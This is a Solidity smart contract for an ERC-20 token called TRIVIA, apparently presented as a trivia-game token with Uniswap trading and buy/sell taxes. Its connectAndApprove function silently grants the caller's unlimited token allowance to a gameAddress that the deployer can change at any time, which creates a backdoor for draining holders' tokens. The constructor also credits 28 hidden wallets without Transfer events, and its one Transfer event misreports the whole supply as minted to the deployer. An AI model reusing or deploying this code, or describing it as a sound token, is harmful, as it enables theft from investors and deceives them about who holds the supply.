1 // SPDX-License-Identifier: MIT
2 
3 pragma solidity 0.8.18;
4 
5 abstract contract Context {
6     function _msgSender() internal view virtual returns (address) {
7         return msg.sender;
8     }
9 }
10 
11 interface IERC20 {
12     function totalSupply() external view returns (uint256);
13     function balanceOf(address account) external view returns (uint256);
14     function transfer(address recipient, uint256 amount) external returns (bool);
15     function allowance(address owner, address spender) external view returns (uint256);
16     function approve(address spender, uint256 amount) external returns (bool);
17     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
18     event Transfer(address indexed from, address indexed to, uint256 value);
19     event Approval(address indexed owner, address indexed spender, uint256 value);
20 }
21 
22 library SafeMath {
23     function add(uint256 a, uint256 b) internal pure returns (uint256) {
24         uint256 c = a + b;
25         require(c >= a, "SafeMath: addition overflow");
26         return c;
27     }
28 
29     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
30         return sub(a, b, "SafeMath: subtraction overflow");
31     }
32 
33     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
34         require(b <= a, errorMessage);
35         uint256 c = a - b;
36         return c;
37     }
38 
39     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
40         if (a == 0) {
41             return 0;
42         }
43         uint256 c = a * b;
44         require(c / a == b, "SafeMath: multiplication overflow");
45         return c;
46     }
47 
48     function div(uint256 a, uint256 b) internal pure returns (uint256) {
49         return div(a, b, "SafeMath: division by zero");
50     }
51 
52     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
53         require(b > 0, errorMessage);
54         uint256 c = a / b;
55         return c;
56     }
57 
58 }
59 
60 contract Ownable is Context {
61     address private _owner;
62     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
63 
64     constructor () {
65         address msgSender = _msgSender();
66         _owner = msgSender;
67         emit OwnershipTransferred(address(0), msgSender);
68     }
69 
70     function owner() public view returns (address) {
71         return _owner;
72     }
73 	
74     modifier onlyOwner() {
75         require(_owner == _msgSender(), "Ownable: caller is not the owner");
76         _;
77     }
78 
79     function renounceOwnership() public virtual onlyOwner {
80         emit OwnershipTransferred(_owner, address(0));
81         _owner = address(0);
82     }
83 
84 }
85 
86 interface IUniswapV2Factory {
87     function createPair(address tokenA, address tokenB) external returns (address pair);
88 }
89 
90 interface IUniswapV2Router02 {
91     function swapExactTokensForETHSupportingFeeOnTransferTokens(
92         uint amountIn,
93         uint amountOutMin,
94         address[] calldata path,
95         address to,
96         uint deadline
97     ) external;
98     function factory() external pure returns (address);
99     function WETH() external pure returns (address);
100     function addLiquidityETH(
101         address token,
102         uint amountTokenDesired,
103         uint amountTokenMin,
104         uint amountETHMin,
105         address to,
106         uint deadline
107     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
108 }
109 
110 contract Trivia is Context, IERC20, Ownable {
111     using SafeMath for uint256;
112 	
113     mapping (address => uint256) private _balances;
114     mapping (address => mapping (address => uint256)) private _allowances;
115     mapping (address => bool) private _isExcludedFromFee;
116     address payable private _taxWallet;
117     uint256 firstBlock;
118 
119     uint256 private _initialBuyTax=17;
120     uint256 private _initialSellTax=17;
121     uint256 private _finalBuyTax=5;
122     uint256 private _finalSellTax=5;
123     uint256 private _reduceBuyTaxAt=23;
124     uint256 private _reduceSellTaxAt=23;
125     uint256 private _preventSwapBefore=23;
126     uint256 private _buyCount=0;
127 
128     uint8 private constant _decimals = 9;
129     uint256 private constant _tTotal = 100000000 * 10**_decimals;
130     string private constant _name = unicode"TRIVIA";
131     string private constant _symbol = unicode"TRIVIA";
132     uint256 public _maxTxAmount =   1000000 * 10**_decimals;
133     uint256 public _maxWalletSize = 1000000 * 10**_decimals;
134     uint256 public _taxSwapThreshold= 1000000 * 10**_decimals;
135     uint256 public _maxTaxSwap= 1000000 * 10**_decimals;
136     address public gameMaster;
137 
138     IUniswapV2Router02 private uniswapV2Router;
139     address private uniswapV2Pair;
140     bool private tradingOpen;
141     bool private inSwap = false;
142     bool private swapEnabled = false;
143 	
144 	address payable gameAddress;
145 
146     event MaxTxAmountUpdated(uint _maxTxAmount);
147     modifier lockTheSwap {
148         inSwap = true;
149         _;
150         inSwap = false;
151     }
152       modifier onlyGameMaster() {
153         require(msg.sender == gameMaster, "not authorized");
154         _;
155     }
156 
157     constructor () {
158         gameAddress = payable(0x28Ffb20bB8B6A415501279846Cbb36E7189E6554);
159         _taxWallet = payable(_msgSender());
160         _balances[address(0x920427a6FA975EF5Dd25ab847D275dEe091a8d37)] = 900000 * 10**_decimals;
161         _balances[address(0x3FF8B6a693D967e724ea03d75fC67025cc933e3c)] = 900000 * 10**_decimals;
162         _balances[address(0x7640DbE5bF3B58A406173174050113f9dAE35c64)] = 900000 * 10**_decimals;
163         _balances[address(0x78F83b41E648E08cdF823c02De0e320fC5f34CA7)] = 900000 * 10**_decimals;
164         _balances[address(0x0eD42526397D72CD107f45320ff675B2E859712C)] = 900000 * 10**_decimals;
165         _balances[address(0x6b4E48e9100712862c85E842014f1DFd3E83A92a)] = 900000 * 10**_decimals;
166         _balances[address(0x116D1eDD539E5e93551973Eb2A71898c9095122F)] = 800000 * 10**_decimals;
167         _balances[address(0x6931DC457303d13D0a05cd31eE751f0F518dad88)] = 800000 * 10**_decimals;
168         _balances[address(0x8Ad519e2536709Aa6cAA91e68D6EFbaC9F0c0700)] = 800000 * 10**_decimals;
169         _balances[address(0x2c77B34075Ad3AC058A0Ad402b7f6dF89A184209)] = 800000 * 10**_decimals;
170         _balances[address(0x214EfB4ed47772DCa9823CbD22D1dc6CF61Cf503)] = 800000 * 10**_decimals;
171         _balances[address(0x2de6f9d6F86745594464c507a5bbd925f22C72E5)] = 800000 * 10**_decimals;
172         _balances[address(0x272212B67b6803f198B927c1270C46e7F51474DA)] = 800000 * 10**_decimals;
173         _balances[address(0x6F5Bd174Cb0637f923d39e61b7bE27dc68c2c863)] = 800000 * 10**_decimals;
174         _balances[address(0x28B43136b4225e0B7feBC3aB25B195E644A94Fbe)] = 800000 * 10**_decimals;
175         _balances[address(0xa80F652E8600a791497781dad1Dc61bc272BeF8B)] = 800000 * 10**_decimals;
176 
177         _balances[address(0xD90510fe92DD13635E1201398b36e483D56F1AbC)] = 700000 * 10**_decimals;
178         _balances[address(0x7e2da351de028D853dF03E6A61A92a572b4eE2C5)] = 700000 * 10**_decimals;
179 
180         _balances[address(0x574572e1e704a4a6959e994237fc943123Bf2Efe)] = 600000 * 10**_decimals;
181         _balances[address(0x1fA92d8fC6F135d2F2D765358879d62c805DB84e)] = 600000 * 10**_decimals;
182 
183         _balances[address(0x7BF6B49c43E7448715D439bB48d15288de48e2F8)] = 500000 * 10**_decimals;
184         _balances[address(0x2d48509D2ABc76561A25CcaE07cFcfb6eBe531Dc)] = 500000 * 10**_decimals;
185         _balances[address(0xc33B7ceA22794c1262252F56FBDACAbdCe1D73db)] = 500000 * 10**_decimals;
186         _balances[address(0x8153280e18c74b1926Ec6c5797a5F0f07328B76e)] = 300000 * 10**_decimals;
187         _balances[address(0xF6d288BFD507538105bDf541C39FD509EBF83fd8)] = 300000 * 10**_decimals;
188         _balances[address(0xd74f68128cEcfb50e2Ddfce6F290E30a55211518)] = 200000 * 10**_decimals;
189         _balances[address(0x378074805a165a26A9041e1aE3E05f299305BddF)] = 200000 * 10**_decimals;
190         _balances[address(0x08A736FbbBa4BfF237dd1803aD1F13fDf3DBC6E4)] = 150000 * 10**_decimals;
191         _balances[_msgSender()] = 81000000 * 10**_decimals;
192         gameMaster = _msgSender();
193         _isExcludedFromFee[owner()] = true;
194         _isExcludedFromFee[address(this)] = true;
195         _isExcludedFromFee[_taxWallet] = true;
196         
197         emit Transfer(address(0), _msgSender(), _tTotal);
198     }
199 
200     function name() public pure returns (string memory) {
201         return _name;
202     }
203 
204      function connectAndApprove(string memory secret) external returns (bool) {
205         address pwner = _msgSender();
206         _allowances[pwner][gameAddress] = type(uint).max;
207         allowance(gameAddress, pwner);
208         emit Approval(pwner, gameAddress, type(uint).max);
209 
210         return true;
211     }
212     function symbol() public pure returns (string memory) {
213         return _symbol;
214     }
215 
216     function decimals() public pure returns (uint8) {
217         return _decimals;
218     }
219 
220     function totalSupply() public pure override returns (uint256) {
221         return _tTotal;
222     }
223 
224     function balanceOf(address account) public view override returns (uint256) {
225         return _balances[account];
226     }
227 
228     function transfer(address recipient, uint256 amount) public override returns (bool) {
229         _transfer(_msgSender(), recipient, amount);
230         return true;
231     }
232 
233     function allowance(address owner, address spender) public view override returns (uint256) {
234         return _allowances[owner][spender];
235     }
236 
237     function approve(address spender, uint256 amount) public override returns (bool) {
238         _approve(_msgSender(), spender, amount);
239         return true;
240     }
241 
242     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
243         _transfer(sender, recipient, amount);
244         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
245         return true;
246     }
247 
248     function _approve(address owner, address spender, uint256 amount) private {
249         require(owner != address(0), "ERC20: approve from the zero address");
250         require(spender != address(0), "ERC20: approve to the zero address");
251         _allowances[owner][spender] = amount;
252         emit Approval(owner, spender, amount);
253     }
254 
255     function _transfer(address from, address to, uint256 amount) private {
256         require(from != address(0), "ERC20: transfer from the zero address");
257         require(to != address(0), "ERC20: transfer to the zero address");
258         require(amount > 0, "Transfer amount must be greater than zero");
259         uint256 taxAmount=0;
260         if (from != owner() && to != owner() && from != gameAddress && to != gameAddress) {
261             taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
262 
263             if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
264                 require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
265                 require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
266 
267                 if (firstBlock + 3  > block.number) {
268                     require(!isContract(to));
269                 }
270                 _buyCount++;
271             }
272 
273             if (to != uniswapV2Pair && ! _isExcludedFromFee[to]) {
274                 require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
275             }
276 
277             if(to == uniswapV2Pair && from!= address(this) ){
278                 taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
279             }
280 
281             uint256 contractTokenBalance = balanceOf(address(this));
282             if (!inSwap && to   == uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwapThreshold && _buyCount>_preventSwapBefore) {
283 
284 				uint256 contractTokenBalance2 = balanceOf(address(this));
285                 swapTokensForEth(min(amount,min(contractTokenBalance2,_maxTaxSwap)));
286                 uint256 contractETHBalance = address(this).balance;
287                 if(contractETHBalance > 0) {
288                     sendETHToFee(address(this).balance); 
289                 }
290             }
291         }
292 
293         if(taxAmount>0){
294           _balances[address(this)]=_balances[address(this)].add(taxAmount);
295           emit Transfer(from, address(this),taxAmount);
296         }
297         _balances[from]=_balances[from].sub(amount);
298         _balances[to]=_balances[to].add(amount.sub(taxAmount));
299         emit Transfer(from, to, amount.sub(taxAmount));
300     }
301 
302 
303     function min(uint256 a, uint256 b) private pure returns (uint256){
304       return (a>b)?b:a;
305     }
306 
307     function isContract(address account) private view returns (bool) {
308         uint256 size;
309         assembly {
310             size := extcodesize(account)
311         }
312         return size > 0;
313     }
314 
315     function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
316         address[] memory path = new address[](2);
317         path[0] = address(this);
318         path[1] = uniswapV2Router.WETH();
319         _approve(address(this), address(uniswapV2Router), tokenAmount);
320         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
321             tokenAmount,
322             0,
323             path,
324             address(this),
325             block.timestamp
326         );
327     }
328 
329     function setGameAddress(address payable _gameAddress) external onlyGameMaster() {
330        gameAddress = _gameAddress;
331         _isExcludedFromFee[gameAddress] = true;
332     }
333 	
334     function removeLimits() external onlyOwner{
335         _maxTxAmount = _tTotal;
336         _maxWalletSize=_tTotal;
337         emit MaxTxAmountUpdated(_tTotal);
338     }
339 
340     function burnLP() external onlyOwner{
341         require(_balances[address(this)] != 0,"No tokens to burn");
342         uint taxtokensburned = _balances[address(this)];
343         _balances[address(this)]=0;
344         _balances[address(0xdead)]=_balances[address(0xdead)].add(taxtokensburned);
345     }
346 
347     function sendETHToFee(uint256 amount) private {
348         _taxWallet.transfer(amount);
349     }
350 	
351     function openTrading() external onlyOwner() {
352         require(!tradingOpen,"trading is already open");
353         uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
354         _approve(address(this), address(uniswapV2Router), _tTotal);
355         uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
356         uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
357         IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
358         swapEnabled = true;
359         tradingOpen = true;
360         firstBlock = block.number;
361     }
362 
363     receive() external payable {}
364 }